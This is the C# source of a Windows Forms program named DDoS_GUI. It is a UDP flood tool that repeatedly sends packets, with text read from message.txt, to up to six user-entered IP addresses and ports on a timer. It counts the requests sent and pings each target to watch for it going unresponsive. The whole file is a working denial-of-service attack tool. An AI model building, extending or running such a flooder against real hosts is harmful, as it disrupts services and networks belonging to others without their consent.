using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Linq;
using System.Windows.Forms;
using System.Collections.Generic;

namespace DDoS_GUI
{
    public partial class Form1 : Form
    {
        public Socket sock;
        public float sentData = 0;
        public int requests1 = 0;
        public int requests2 = 0;
        public int requests3 = 0;
        public int requests4 = 0;
        public int requests5 = 0;
        public int requests6 = 0;
        public List<string> ips = new List<string>();
        string message = System.IO.File.ReadAllText(@".\message.txt");
        public Form1()
        {
            InitializeComponent();
            this.FormBorderStyle = FormBorderStyle.FixedSingle;
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            sendPacket1(textBox1.Text, textBox2.Text, message);
            if (checkBox1.Checked) sendPacket2(textBox3.Text, textBox2.Text, message);
            if (checkBox2.Checked) sendPacket3(textBox4.Text, textBox2.Text, message);
            if (checkBox3.Checked) sendPacket4(textBox5.Text, textBox2.Text, message);
            if (checkBox4.Checked) sendPacket5(textBox6.Text, textBox2.Text, message);
            if (checkBox5.Checked) sendPacket6(textBox7.Text, textBox2.Text, message);
            label1.Text = $"Requests: {requests1}";
            label4.Text = $"Requests: {requests2}";
            label5.Text = $"Requests: {requests3}";
            label6.Text = $"Requests: {requests4}";
            label7.Text = $"Requests: {requests5}";
            label8.Text = $"Requests: {requests6}";
        }
        void sendMassPackets()
        {

        }
        private void Form1_Load(object sender, EventArgs e)
        {

        }

        public void sendPacket1(string ip,string port,string text)
        {
            
            sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);

            IPAddress serverAddr = IPAddress.Parse(ip);

            IPEndPoint endPoint = new IPEndPoint(serverAddr, int.Parse(port));

            byte[] send_buffer = Encoding.ASCII.GetBytes(text);

            sock.SendTo(send_buffer, endPoint);
            requests1++;
        }

        public void sendPacket2(string ip, string port, string text)
        {

            sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);

            IPAddress serverAddr = IPAddress.Parse(ip);

            IPEndPoint endPoint = new IPEndPoint(serverAddr, int.Parse(port));

            byte[] send_buffer = Encoding.ASCII.GetBytes(text);

            sock.SendTo(send_buffer, endPoint);
            requests2++;
        }

        public void sendPacket3(string ip, string port, string text)
        {

            sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);

            IPAddress serverAddr = IPAddress.Parse(ip);

            IPEndPoint endPoint = new IPEndPoint(serverAddr, int.Parse(port));

            byte[] send_buffer = Encoding.ASCII.GetBytes(text);

            sock.SendTo(send_buffer, endPoint);
            requests3++;
        }

        public void sendPacket4(string ip, string port, string text)
        {

            sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);

            IPAddress serverAddr = IPAddress.Parse(ip);

            IPEndPoint endPoint = new IPEndPoint(serverAddr, int.Parse(port));

            byte[] send_buffer = Encoding.ASCII.GetBytes(text);

            sock.SendTo(send_buffer, endPoint);
            requests4++;
        }

        public void sendPacket5(string ip, string port, string text)
        {

            sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);

            IPAddress serverAddr = IPAddress.Parse(ip);

            IPEndPoint endPoint = new IPEndPoint(serverAddr, int.Parse(port));

            byte[] send_buffer = Encoding.ASCII.GetBytes(text);

            sock.SendTo(send_buffer, endPoint);
            requests5++;
        }

        public void sendPacket6(string ip, string port, string text)
        {

            sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);

            IPAddress serverAddr = IPAddress.Parse(ip);

            IPEndPoint endPoint = new IPEndPoint(serverAddr, int.Parse(port));

            byte[] send_buffer = Encoding.ASCII.GetBytes(text);

            sock.SendTo(send_buffer, endPoint);
            requests6++;
        }



        private void button1_Click(object sender, EventArgs e)
        {
            textBox1.ReadOnly = true;
            textBox2.ReadOnly = true;
            textBox3.ReadOnly = true;
            textBox4.ReadOnly = true;
            textBox5.ReadOnly = true;
            textBox6.ReadOnly = true;
            textBox7.ReadOnly = true;

            checkBox1.Enabled = false;
            checkBox2.Enabled = false;
            checkBox3.Enabled = false;
            checkBox4.Enabled = false;
            checkBox5.Enabled = false;
            ips.Add(textBox1.Text);
            if (checkBox1.Checked) ips.Add(textBox3.Text);
            if (checkBox2.Checked) ips.Add(textBox4.Text);
            if (checkBox3.Checked) ips.Add(textBox5.Text);
            if (checkBox4.Checked) ips.Add(textBox6.Text);
            if (checkBox5.Checked) ips.Add(textBox7.Text);
            timer1.Start();
            timer2.Start();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            textBox1.ReadOnly = false;
            textBox2.ReadOnly = false;
            textBox3.ReadOnly = false;
            textBox4.ReadOnly = false;
            textBox5.ReadOnly = false;
            textBox6.ReadOnly = false;
            textBox7.ReadOnly = false;

            checkBox1.Enabled = true;
            checkBox2.Enabled = true;
            checkBox3.Enabled = true;
            checkBox4.Enabled = true;
            checkBox5.Enabled = true;

            timer1.Stop();
            timer2.Stop();
            ips.Clear();
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            listBox1.Items.Clear();
            foreach(string ip in ips)
            {
                string toAdd = PingHost(ip);
                listBox1.Items.Add(toAdd);
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            listBox1.Items.Clear();
            requests1 = 0;
            requests2 = 0;
            requests3 = 0;
            requests4 = 0;
            requests5 = 0;
            requests6 = 0;
            label1.Text = $"Requests: {requests1}";
            label4.Text = $"Requests: {requests2}";
            label5.Text = $"Requests: {requests3}";
            label6.Text = $"Requests: {requests4}";
            label7.Text = $"Requests: {requests5}";
            label8.Text = $"Requests: {requests6}";
        }

        public static string PingHost(string ip)
        {
            bool pingable = false;
            Ping pinger = null;
            PingReply reply = null;
            IPAddress ipAddr = null;
            try
            {
                ipAddr = IPAddress.Parse(ip);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
            
            try
            {
                pinger = new Ping();
                reply = pinger.Send(ipAddr, 500);
                pingable = reply.Status == IPStatus.Success;
            }
            catch(Exception ex)
            { 
                MessageBox.Show(ex.ToString());
            }
            
            if (pingable)
            {
                return ip + " : " + reply.RoundtripTime.ToString();
            }

            else
            {
                return ip + " : Request Timed Out.";
            }        
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }
    }
}
